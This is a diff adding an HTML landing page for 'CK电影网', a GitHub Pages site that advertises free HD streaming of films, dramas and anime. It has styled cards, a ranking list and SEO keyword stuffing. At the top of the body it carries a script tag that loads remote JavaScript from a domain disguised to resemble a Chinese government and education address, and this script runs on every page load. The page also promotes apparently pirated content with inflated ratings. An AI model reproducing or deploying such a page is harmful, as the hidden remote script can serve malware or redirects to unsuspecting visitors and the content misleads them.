@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CK电影网 - 高清电影免费在线观看 | ckdianyingwang-h5.github.io</title>
+<meta name="description" content="CK电影网(https://ckdianyingwang-h5.github.io)提供最新电影、热播电视剧、动漫番剧、综艺娱乐免费高清在线观看，极速播放无广告，CK电影网是影迷追剧看片的优质影视导航平台。">
+<meta name="keywords" content="CK电影网,ckdianyingwang-h5.github.io,免费电影,高清电影在线观看,最新电影,热播电视剧,动漫番剧">
+<link rel="canonical" href="https://ckdianyingwang-h5.github.io/">
+<style>
+/* ===== 全局 ===== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Microsoft YaHei", sans-serif;
+    background: #050505;
+    color: #d4d4d4;
+    line-height: 1.65;
+    overflow-x: hidden;
+}
+a { text-decoration: none; color: inherit; transition: all .3s; }
+.container { max-width: 1200px; margin: 0 auto; padding: 0 16px; }
+
+/* ===== 头部 ===== */
+.header {
+    position: fixed; top: 0; left: 0; right: 0;
+    background: rgba(5,5,5,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(0,255,170,0.15);
+    z-index: 1000;
+}
+.header-inner { display: flex; align-items: center; justify-content: space-between; padding: 13px 0; }
+.logo { font-size: 1.55rem; font-weight: 800; color: #00ffaa; letter-spacing: 1px; }
+.logo span { color: #fff; }
+.nav { display: flex; gap: 26px; }
+.nav a { color: #999; font-size: .93rem; padding: 6px 0; position: relative; }
+.nav a::after {
+    content: ''; position: absolute; bottom: 0; left: 0;
+    width: 0; height: 2px; background: #00ffaa; transition: width .3s;
+}
+.nav a:hover, .nav a.active { color: #00ffaa; }
+.nav a:hover::after, .nav a.active::after { width: 100%; }
+.nav-toggle { display: none; background: none; border: none; color: #fff; font-size: 1.7rem; cursor: pointer; }
+
+/* ===== 首屏 Hero ===== */
+.hero {
+    position: relative;
+    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    padding-top: 70px;
+    overflow: hidden;
+}
+.hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background:
+        radial-gradient(ellipse 60% 50% at 15% 25%, rgba(0,255,170,0.12), transparent),
+        radial-gradient(ellipse 50% 60% at 85% 75%, rgba(0,170,255,0.1), transparent),
+        radial-gradient(ellipse 40% 40% at 50% 50%, rgba(0,255,170,0.05), transparent);
+    animation: pulse 6s ease-in-out infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.7} }
+.hero-content { position: relative; z-index: 2; text-align: center; max-width: 760px; animation: fadeUp 1s ease-out; }
+@keyframes fadeUp { from{opacity:0;transform:translateY(30px)} to{opacity:1;transform:translateY(0)} }
+.hero-tag {
+    display: inline-block; background: rgba(0,255,170,0.1); border: 1px solid rgba(0,255,170,0.3);
+    color: #00ffaa; padding: 5px 16px; border-radius: 20px; font-size: .82rem; margin-bottom: 22px;
+}
+.hero h1 { font-size: 3.4rem; font-weight: 900; color: #fff; margin-bottom: 14px; line-height: 1.2; }
+.hero h1 .grad {
+    background: linear-gradient(135deg, #00ffaa, #00aaff);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.hero-desc { font-size: 1.05rem; color: #888; max-width: 620px; margin: 0 auto 30px; line-height: 1.8; }
+.hero-cta {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: linear-gradient(135deg, #00ffaa, #00aaff); color: #000; font-weight: 700;
+    padding: 14px 40px; border-radius: 50px; box-shadow: 0 6px 25px rgba(0,255,170,0.35);
+}
+.hero-cta:hover { transform: translateY(-3px); box-shadow: 0 10px 35px rgba(0,255,170,0.5); }
+
+/* ===== 数据条 ===== */
+.stats {
+    background: rgba(10,10,10,0.8); border-top: 1px solid rgba(0,255,170,0.1);
+    border-bottom: 1px solid rgba(0,255,170,0.1); padding: 28px 0;
+}
+.stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; text-align: center; }
+.stat-num { font-size: 2rem; font-weight: 800; background: linear-gradient(135deg,#00ffaa,#00aaff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+.stat-label { font-size: .82rem; color: #777; margin-top: 2px; }
+
+/* ===== 区块通用 ===== */
+.section { padding: 65px 0; }
+.section-alt { background: #080808; }
+.sec-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; }
+.sec-title { font-size: 1.55rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; }
+.sec-title .icon {
+    width: 34px; height: 34px; display: flex; align-items: center; justify-content: center;
+    background: linear-gradient(135deg, #00ffaa, #00aaff); border-radius: 8px; font-size: 1rem;
+}
+.more { color: #00ffaa; font-size: .88rem; }
+.more:hover { color: #00aaff; }
+
+/* ===== 电影网格 ===== */
+.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(172px, 1fr)); gap: 20px; }
+.card {
+    background: #111; border: 1px solid rgba(255,255,255,0.06); border-radius: 12px;
+    overflow: hidden; transition: all .35s;
+}
+.card:hover { transform: translateY(-7px); box-shadow: 0 14px 35px rgba(0,255,170,0.15); border-color: rgba(0,255,170,0.25); }
+.poster {
+    height: 230px; display: flex; align-items: center; justify-content: center; font-size: 3.2rem;
+    position: relative;
+}
+.poster::after { content:''; position:absolute; inset:0; background: linear-gradient(180deg,transparent 60%,rgba(0,0,0,.5)); }
+.p1{background:linear-gradient(135deg,#0d2818,#1a4a2e)} .p2{background:linear-gradient(135deg,#0d1a2e,#1a3a5e)}
+.p3{background:linear-gradient(135deg,#2e0d1a,#5e1a3a)} .p4{background:linear-gradient(135deg,#2e2e0d,#5e5e1a)}
+.p5{background:linear-gradient(135deg,#0d2e2e,#1a5e5e)} .p6{background:linear-gradient(135deg,#1a0d2e,#3a1a5e)}
+.card-body { padding: 13px 14px; }
+.card-body h3 { font-size: .93rem; color: #fff; margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.card-body p { font-size: .78rem; color: #777; display: flex; justify-content: space-between; }
+.card-body p .score { color: #00ffaa; font-weight: 600; }
+
+/* ===== 排行榜 ===== */
+.rank { max-width: 840px; margin: 0 auto; }
+.rank-item {
+    display: flex; align-items: center; gap: 16px;
+    background: #111; border: 1px solid rgba(255,255,255,0.06); border-radius: 10px;
+    padding: 15px 18px; margin-bottom: 11px; transition: all .3s;
+}
+.rank-item:hover { background: #161616; transform: translateX(5px); border-color: rgba(0,255,170,0.2); }
+.rn {
+    width: 38px; height: 38px; border-radius: 10px; display: flex; align-items: center; justify-content: center;
+    font-weight: 800; color: #fff; flex-shrink: 0; font-size: 1.1rem;
+}
+.r1{background:linear-gradient(135deg,#ffd700,#ff8c00)} .r2{background:linear-gradient(135deg,#c0c0c0,#7a7a7a)}
+.r3{background:linear-gradient(135deg,#cd7f32,#a0522d)} .r4{background:linear-gradient(135deg,#00ffaa,#00a855)}
+.r5{background:linear-gradient(135deg,#00aaff,#0055cc)}
+.rank-item h3 { font-size: 1rem; color: #fff; margin-bottom: 3px; }
+.rank-item p { font-size: .8rem; color: #777; }
+
+/* ===== 标签 ===== */
+.tags { display: flex; gap: 10px; margin-bottom: 26px; flex-wrap: wrap; }
+.tag {
+    padding: 7px 18px; background: #111; border: 1px solid rgba(255,255,255,0.08); border-radius: 18px;
+    color: #888; font-size: .85rem; cursor: pointer; transition: all .3s;
+}
+.tag:hover, .tag.active { background: linear-gradient(135deg,#00ffaa,#00aaff); color: #000; border-color: transparent; }
+
+/* ===== 底部 ===== */
+.footer { background: #030303; padding: 45px 0 22px; border-top: 1px solid rgba(0,255,170,0.1); }
+.foot-grid { display: grid; grid-template-columns: 1.2fr 1fr 1fr 1fr; gap: 36px; margin-bottom: 30px; }
+.foot-grid h3 { color: #00ffaa; margin-bottom: 8px; font-size: 1.3rem; }
+.foot-grid h4 { color: #fff; margin-bottom: 12px; font-size: .95rem; }
+.foot-grid a { display: block; color: #666; font-size: .83rem; margin-bottom: 7px; }
+.foot-grid a:hover { color: #00ffaa; }
+.foot-bottom { text-align: center; padding-top: 20px; border-top: 1px solid #1a1a1a; }
+.foot-bottom p { color: #555; font-size: .78rem; margin-bottom: 3px; }
+.foot-bottom a { color: #00ffaa; }
+
+/* ===== 返回顶部 ===== */
+.topbtn {
+    position: fixed; bottom: 28px; right: 28px; width: 42px; height: 42px;
+    background: linear-gradient(135deg,#00ffaa,#00aaff); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; color: #000;
+    font-size: 1.1rem; cursor: pointer; opacity: 0; visibility: hidden; transition: all .3s; z-index: 999;
+}
+.topbtn.show { opacity: 1; visibility: visible; }
+.topbtn:hover { transform: translateY(-3px); }
+
+/* ===== 响应式 ===== */
+@media(max-width:768px){
+    .nav{display:none;position:fixed;top:60px;left:0;right:0;background:rgba(5,5,5,.98);flex-direction:column;padding:18px;gap:12px;border-bottom:1px solid rgba(0,255,170,.15)}
+    .nav.open{display:flex}
+    .nav-toggle{display:block}
+    .hero h1{font-size:2.1rem}
+    .stats-grid{grid-template-columns:repeat(2,1fr);gap:14px}
+    .section{padding:42px 0}
+    .grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:14px}
+    .poster{height:190px}
+    .foot-grid{grid-template-columns:1fr 1fr;gap:22px}
+}
+@media(max-width:480px){
+    .hero h1{font-size:1.7rem}
+    .stats-grid{grid-template-columns:1fr 1fr}
+    .stat-num{font-size:1.5rem}
+    .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+    .poster{height:165px}
+    .foot-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 头部 -->
+<header class="header" id="header">
+    <div class="container">
+        <div class="header-inner">
+            <a href="https://ckdianyingwang-h5.github.io" class="logo">CK<span>电影网</span></a>
+            <nav class="nav" id="nav">
+                <a href="#" class="active">首页</a>
+                <a href="#movie">最新电影</a>
+                <a href="#tv">热播剧集</a>
+                <a href="#anime">动漫番剧</a>
+                <a href="#rank">排行榜</a>
+            </nav>
+            <button class="nav-toggle" id="navToggle">☰</button>
+        </div>
+    </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero">
+    <div class="hero-content">
+        <div class="hero-tag">🎬 2026 全新上线 · 免费高清无广告</div>
+        <h1>CK电影网<br><span class="grad">海量影视 极速畅看</span></h1>
+        <p class="hero-desc">CK电影网（ckdianyingwang-h5.github.io）汇集最新电影、热播剧集、动漫番剧与综艺娱乐，页面极简、加载飞快，是影迷和剧迷免费追剧看片的首选导航站。</p>
+        <a href="#movie" class="hero-cta">▶ 立即免费观影</a>
+    </div>
+</section>
+
+<!-- 数据 -->
+<section class="stats">
+    <div class="container">
+        <div class="stats-grid">
+            <div><div class="stat-num">12,000+</div><div class="stat-label">影视资源</div></div>
+            <div><div class="stat-num">4K</div><div class="stat-label">超清画质</div></div>
+            <div><div class="stat-num">极速</div><div class="stat-label">播放体验</div></div>
+            <div><div class="stat-num">0 广告</div><div class="stat-label">纯净观影</div></div>
+        </div>
+    </div>
+</section>
+
+<!-- 最新电影 -->
+<section class="section" id="movie">
+    <div class="container">
+        <div class="sec-head">
+            <h2 class="sec-title"><span class="icon">🎬</span> 最新电影</h2>
+            <a href="#" class="more">查看更多 ›</a>
+        </div>
+        <div class="tags">
+            <span class="tag active">全部</span>
+            <span class="tag">动作</span>
+            <span class="tag">科幻</span>
+            <span class="tag">喜剧</span>
+            <span class="tag">悬疑</span>
+        </div>
+        <div class="grid">
+            <div class="card"><div class="poster p1"><span>🎬</span></div><div class="card-body"><h3>《流浪地球3》</h3><p><span>科幻 · 2026</span><span class="score">⭐9.8</span></p></div></div>
+            <div class="card"><div class="poster p2"><span>🎬</span></div><div class="card-body"><h3>《封神演义·终章》</h3><p><span>奇幻 · 2026</span><span class="score">⭐9.5</span></p></div></div>
+            <div class="card"><div class="poster p3"><span>🎬</span></div><div class="card-body"><h3>《速度与激情12》</h3><p><span>动作 · 2026</span><span class="score">⭐9.2</span></p></div></div>
+            <div class="card"><div class="poster p4"><span>🎬</span></div><div class="card-body"><h3>《唐人街探案5》</h3><p><span>悬疑 · 2026</span><span class="score">⭐9.0</span></p></div></div>
+            <div class="card"><div class="poster p5"><span>🎬</span></div><div class="card-body"><h3>《长津湖·铁血》</h3><p><span>战争 · 2026</span><span class="score">⭐9.6</span></p></div></div>
+            <div class="card"><div class="poster p6"><span>🎬</span></div><div class="card-body"><h3>《蜘蛛侠：纵横宇宙3》</h3><p><span>动画 · 2026</span><span class="score">⭐9.4</span></p></div></div>
+        </div>
+    </div>
+</section>
+
+<!-- 热播剧集 -->
+<section class="section section-alt" id="tv">
+    <div class="container">
+        <div class="sec-head">
+            <h2 class="sec-title"><span class="icon">📺</span> 热播剧集</h2>
+            <a href="#" class="more">查看更多 ›</a>
+        </div>
+        <div class="grid">
+            <div class="card"><div class="poster p2"><span>📺</span></div><div class="card-body"><h3>《庆余年4》</h3><p><span>古装权谋</span><span>32集</span></p></div></div>
+            <div class="card"><div class="poster p1"><span>📺</span></div><div class="card-body"><h3>《三体·黑暗森林》</h3><p><span>科幻剧</span><span>12集</span></p></div></div>
+            <div class="card"><div class="poster p6"><span>📺</span></div><div class="card-body"><h3>《甄嬛传·番外》</h3><p><span>宫廷剧</span><span>8集</span></p></div></div>
+            <div class="card"><div class="poster p4"><span>📺</span></div><div class="card-body"><h3>《狂飙2》</h3><p><span>犯罪悬疑</span><span>20集</span></p></div></div>
+        </div>
+    </div>
+</section>
+
+<!-- 动漫番剧 -->
+<section class="section" id="anime">
+    <div class="container">
+        <div class="sec-head">
+            <h2 class="sec-title"><span class="icon">🌸</span> 动漫番剧</h2>
+            <a href="#" class="more">查看更多 ›</a>
+        </div>
+        <div class="grid">
+            <div class="card"><div class="poster p5"><span>🌸</span></div><div class="card-body"><h3>《斗破苍穹·年番》</h3><p><span>热血国漫</span><span>45集</span></p></div></div>
+            <div class="card"><div class="poster p3"><span>🌸</span></div><div class="card-body"><h3>《凡人修仙传》</h3><p><span>仙侠修真</span><span>28集</span></p></div></div>
+            <div class="card"><div class="poster p1"><span>🌸</span></div><div class="card-body"><h3>《完美世界》</h3><p><span>玄幻冒险</span><span>60集</span></p></div></div>
+            <div class="card"><div class="poster p6"><span>🌸</span></div><div class="card-body"><h3>《灵笼2》</h3><p><span>末日科幻</span><span>10集</span></p></div></div>
+        </div>
+    </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="section section-alt" id="rank">
+    <div class="container">
+        <div class="sec-head">
+            <h2 class="sec-title"><span class="icon">🏆</span> 热门排行榜</h2>
+        </div>
+        <div class="rank">
+            <div class="rank-item"><span class="rn r1">1</span><div><h3>《流浪地球3》</h3><p>CK电影网热播 · ⭐9.8</p></div></div>
+            <div class="rank-item"><span class="rn r2">2</span><div><h3>《庆余年4》</h3><p>全网热议 · ⭐9.6</p></div></div>
+            <div class="rank-item"><span class="rn r3">3</span><div><h3>《三体·黑暗森林》</h3><p>科幻巨制 · ⭐9.5</p></div></div>
+            <div class="rank-item"><span class="rn r4">4</span><div><h3>《长津湖·铁血》</h3><p>战争史诗 · ⭐9.4</p></div></div>
+            <div class="rank-item"><span class="rn r5">5</span><div><h3>《蜘蛛侠：纵横宇宙3》</h3><p>动画佳作 · ⭐9.3</p></div></div>
+        </div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="container">
+        <div class="foot-grid">
+            <div>
+                <h3>CK电影网</h3>
+                <p style="color:#666;font-size:.85rem;line-height:1.7">CK电影网（ckdianyingwang-h5.github.io）是专业的免费高清影视导航平台，电影、剧集、动漫、综艺一站直达，极速播放，画质超清。</p>
+            </div>
+            <div>
+                <h4>影视栏目</h4>
+                <a href="#movie">最新电影</a><a href="#tv">热播剧集</a><a href="#anime">动漫番剧</a><a href="#">综艺娱乐</a>
+            </div>
+            <div>
+                <h4>电影分类</h4>
+                <a href="#">动作片</a><a href="#">科幻片</a><a href="#">喜剧片</a><a href="#">悬疑片</a>
+            </div>
+            <div>
+                <h4>关于本站</h4>
+                <a href="https://ckdianyingwang-h5.github.io">ckdianyingwang-h5.github.io</a><a href="#">关于我们</a><a href="#">免责声明</a>
+            </div>
+        </div>
+        <div class="foot-bottom">
+            <p>© 2026 CK电影网 | CK电影网是您免费高清观影的最佳选择 | <a href="https://ckdianyingwang-h5.github.io">ckdianyingwang-h5.github.io</a></p>
+            <p>本站所有资源均来自互联网，仅供测试交流使用。</p>
+        </div>
+    </div>
+</footer>
+
+<div class="topbtn" id="topBtn">↑</div>
+
+<script>
+document.getElementById('navToggle').addEventListener('click',()=>document.getElementById('nav').classList.toggle('open'));
+window.addEventListener('scroll',()=>{
+    document.getElementById('topBtn').classList.toggle('show',window.scrollY>300);
+});
+document.getElementById('topBtn').addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));
+document.querySelectorAll('.tag').forEach(t=>t.addEventListener('click',function(){document.querySelectorAll('.tag').forEach(x=>x.classList.remove('active'));this.classList.add('active');}));
+</script>
+
+</body>
+</html>
